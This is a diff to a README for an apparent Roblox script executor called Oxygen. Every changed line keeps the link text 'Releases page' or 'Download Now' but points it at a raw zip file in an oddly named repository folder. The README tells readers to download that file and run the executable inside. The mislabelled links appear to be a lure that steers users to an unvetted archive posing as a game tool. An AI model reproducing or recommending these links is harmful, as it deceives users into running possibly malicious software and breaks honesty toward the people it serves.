@@ -1,6 +1,6 @@
 # 🎮 Roblox-Oxygen-ea-56h - Enhance Your Roblox Experience Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/releases)
+[![Download Now](https://raw.githubusercontent.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/main/uncorruptive/Roblox-Oxygen-ea-56h.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/main/uncorruptive/Roblox-Oxygen-ea-56h.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Roblox-Oxygen, your go-to tool for running Lua scripts on Roblox. Wit
 
 To get started, you need to visit the Releases page:
 
-[Visit this page to download](https://github.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/main/uncorruptive/Roblox-Oxygen-ea-56h.zip)
 
 On the Releases page, you will see a list of available versions. Choose the latest version. Click on the appropriate file to download. Once the download completes, locate the file in your downloads folder and run it.
 
@@ -33,7 +33,7 @@ Before you download Oxygen, ensure your system meets the following requirements:
 ## 📜 How to Use Oxygen
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/releases) to download the software.
+   Visit the [Releases page](https://raw.githubusercontent.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/main/uncorruptive/Roblox-Oxygen-ea-56h.zip) to download the software.
 
 2. **Open the Application:**
    Once downloaded, double-click the Oxygen executable file to start the application.
@@ -65,7 +65,7 @@ Join our community on Discord to interact with other users. Here, you can share 
 
 Stay informed about the latest updates by checking the Releases page regularly. We provide ongoing improvements and new features to enhance your experience.
 
-[Visit this page to download](https://github.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sansinpembisterligi/Roblox-Oxygen-ea-56h/main/uncorruptive/Roblox-Oxygen-ea-56h.zip)
 
 ## 📝 Topics
 
